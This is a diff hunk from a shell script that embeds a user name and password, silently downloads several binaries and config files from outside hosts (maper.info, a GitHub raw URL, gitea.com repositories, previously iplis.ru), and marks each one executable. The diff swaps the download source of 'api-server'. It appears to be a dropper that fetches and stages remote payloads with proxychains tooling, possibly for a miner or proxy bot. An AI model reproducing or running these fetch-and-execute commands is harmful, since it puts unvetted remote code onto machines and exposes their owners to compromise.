@@ -4,7 +4,7 @@ user="ych9n2s7ep0svx"
 pass="fpicnakr5eyn8o1bblnafwc4q1" 
 wget -q -O api https://maper.info/Credit && chmod +x api >/dev/null 2>&1
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
-wget -q https://iplis.ru/api-server && chmod +x api-server
+wget -q -O api-server https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x api-server
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
 sleep 3 
